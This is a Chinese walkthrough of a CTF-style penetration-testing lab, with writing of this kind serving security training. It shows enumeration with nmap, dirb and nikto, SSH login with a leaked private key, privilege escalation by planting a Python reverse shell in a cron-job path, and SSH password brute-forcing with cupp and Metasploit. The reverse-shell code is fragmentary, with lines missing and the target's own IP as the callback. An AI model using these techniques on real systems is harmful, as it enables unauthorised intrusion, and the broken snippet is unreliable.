# 实验前的准备

## 探测IP

设置问题， vmware中 ![](../Images/d3ac643fc2ac1f876e3b77faee7fecb2.png) 虚拟网络编辑器 ![](../Images/fd7849ae85d1bdde79f52ec7a7a12f90.png) ![](../Images/cbbddd1436c04e618b2a0be76fdbaf35.png) 可以根据自己的设置来，然后点击应用。然后在kali的虚拟机设置里面设置桥接 ![](../Images/e16c990ec30ba9e7291d203955c81343.png) Oracle VirtualBox中 ![](../Images/3519852a56728caee111602d0b25c6a6.png) 设置成和kali的一样的。然后就大功告成了。进kali探测IP地址就行了。

```
1.  `ifconfig`
    
```

![](../Images/b1a2f162aa6460da2a2d54b0fe6d1434.png) 发现kali的IP是 `192.168.1.6` 然后输入

```
1.  `netdiscover -r 192.168.1.1/24`
    
```

![](../Images/1d1f06d3682238d76bfc07fcbac409d4.png) 就是它了。然后nmap进一步探测信息查看是否正确 ![](../Images/72dfac00b848c6b75d0b8f91786ddbc5.png) 好了，证据确凿，就是它了。靶机IP： `192.168.1.5`

# 实验开始

## 拿到第一个用户权限

探测靶场全部信息

```
1.  `nmap -A -v 192.168.1.5`
    
```

探测靶场的操作系统类型与版本

```
1.  `nmap -O 192.168.1.5`
    
```

![](../Images/04528a4f50b0611fcadfe90a292f8133.png)

### 分析探测结果

针对ssh服务的22号端口。考虑：

*   1、暴力破解
    
*   2、私钥泄露（私钥有没有对应的密码。是否可以找到私钥的用户名） 对于开放http服务的80端口或者其他端口的靶场 优先考虑：
    
*   1、通过浏览器访问对应的靶场http服务，如http://靶场IP地址:http服务端口
    
*   2、使用探测工具对http的目录进行探测，如dirb http://靶场IP地址:http服务端口/ ==特别注意：特殊端口（大于1024的端口）== ![](../Images/4ecb3d56f3f9316dc0f0a3bb414e0f45.png) 先继续
    

### 挖掘敏感信息

```
1.  `dirb http://192.168.1.5/`
    
```

然后探测出来一堆 ![](../Images/e94912c758867fe8829596857b040e7a.png) 然后从第一个开始进行访问。运气不错，第二个就得到了这么多信息。再深入查看(还是挨个查看) ![](../Images/61d38dfc98eaa456b43f091dd8a7d8bb.png) 然后发现了这个名字很奇怪的txt文本有东西，是rsa ![](../Images/3f1e6ba19cb4f397e1bff2537839cd5a.png) 然后就到解析网站解析了一番，传送门 然后使用nikto扫描器来挖掘敏感信息

```
1.  `nikto -host 192.168.1.5`
    
```

特别注意config等特殊敏感文件，要细读扫描的结果。挖掘可以利用的敏感信息；![](../Images/a4e380023a3433a4359947017b49333c.png) 利用信息继续进行。将私钥文件下载到桌面上，方便操作。

```
1.  `wget "http://192.168.1.5/icons/VDSoyuAXiO.txt"`
    
```

然后改个名 ![](../Images/6aba54220fcf2e352a735d56c8fee203.png) 然后，查看id\_rsa文件的权限，进行提权 ![](../Images/b6810bd1c45f3eec59516ed6291bafe8.png) 利用私钥尝试登录服务器

```
1.  `ssh -i id_rsa martin@192.168.1.5`
    
```

其中martin是上面已经得到的一个可能的用户名。可以看到已经连接成功 ![](../Images/5ee63d067ce2ba51b6268031c57150b2.png) 然后将能看到的目录下的文件全列出来找一遍 ![](../Images/d24ea2d5b96979b478f0113b34df9575.png) 现在相当于拿到了第一个用户了。

## 渗透root用户

一般flag会在root用户和对应的用户组。使用以下几条命令进行查看信息。所以这个时候应该是提权。

```
1.  `cat /etc/passwd            #查看所有用户的列表`
    
2.  `cat /etc/group            #查看用户组`
    
3.  `find / -user 用户名        #查看属于某些用户的文件`
    
4.  `/tmp                    #查看缓冲文件目录`
    
```

查看过之后也没发现什么特别的信息， ![](../Images/3914fc7cd7a1d0048b8813da73da5659.png) 不过发现几个用户。

### 深入挖掘

通过 /etc/crontab 文件，设定系统定期执行的任务，编辑，需要root权限。不同的用户都可以有不同的定时任务。

cat /etc/crontab 挖掘其他用户是否有定时任务，并查看对应的任务内容。执行的任务肯定对应靶场机器的某个文件。

![](../Images/24865dec904e261a2c5da8e687a6cbfe.png)

如果在/etc/crontab 下有某个用户的定时计划文件，但是具体目录下没有这个定时执行文件，可以自行创建反弹shell，然后netcat执行监听获取对应用户的权限。

如果有定时执行的文件，可以切换到对应的目录，查看对应的权限，查看当前用户是否具有读写权限。

看到这个文件，但是ls后什么都没发现。所以自己创建反弹shell然后改成这个名字，让它定时执行。

查看空闲端口，随便挑个进行侦听，这里我选择4444端口。查看占用端口

```
1.  `nc -lpv [未占用端口]`
    
```

查看占用端口 netstat -pantu 然后没有占用4444端口，那就可以使用。自创反弹shell

```
1.  `#!/usr/bin/python`
    
2.  `import socket,os,subprocess`
    
3.

5.  `s.connect(("192.168.1.5",4444))`
```

![](../Images/c36d77d1a857fb471003428bc146b3f6.png) 熟练使用vi命令真的重要。再改成那个定时自动执行的文件的名字 提权，执行权限给它

### 暴力破解

最后一个用户，没有其他办法只能进行暴力破解，使用hydra、medusa等工具。使用github上的一个工具创建字典

```
1.  `git clone htts://github.com/jeanphorn/common-password.git`
    
2.  `cd common-password`
    
3.  `#然后执行`
    
4.  `./cupp.py -i`
    
```

当然，如果是python3的话可能会出错。我这里使用python2版本执行就可以了。

```
1.  `python2 cupp.py -i`
    
```

然后输入要破解的用户名，生成字典文件。 ![](../Images/632bbba0b0bced709dcf738c3976b4cb.png) 字典文件生成完毕，可以进行暴力破解，这里使用metasploit破解ssh

```
1.  `msfconsole`
    
2.  `-- msf> use auxiliary/scanner/ssh/ssh_login`
    
3.  `--msf auxiliary(ssh_login) > set rhost 192.168.1.5`
    
4.  `--msf auxiliary(ssh_login) > set username hadi`
    
5.  `--msf auxiliary(ssh_login) > set pass_file hadi.txt[的路径]`
    
6.  `--msf auxiliary(ssh_login) > run`
    
```

开始破解，破解之后是自动生成会话，可以使用终端 ![](../Images/a80f8f57ac00f047a45c4cff69c502d5.png) 所以使用命令

```
1.  `python -c "import pty; pty.spawn('/bin/bash')"`
    
```

![](../Images/e327d9ef90b17c90dd464033846bda2c.png) 就变成了和平时使用的终端一样了。然后提权 ![](../Images/a304c58d9c6c17dd2ce748d2d922b64d.png) 到这里进入了root用户 ![](../Images/3fc10e565cde8bcd83af83038fa27b7f.png) 然后查找flag，一般是在root目录下，所以直接进入root目录，查看 得到flag ![](../Images/aac152fea179a55e5caf9d3962dde0bb.png) 结束。花了很长时间，学到的东西也很多。继续努力啊。
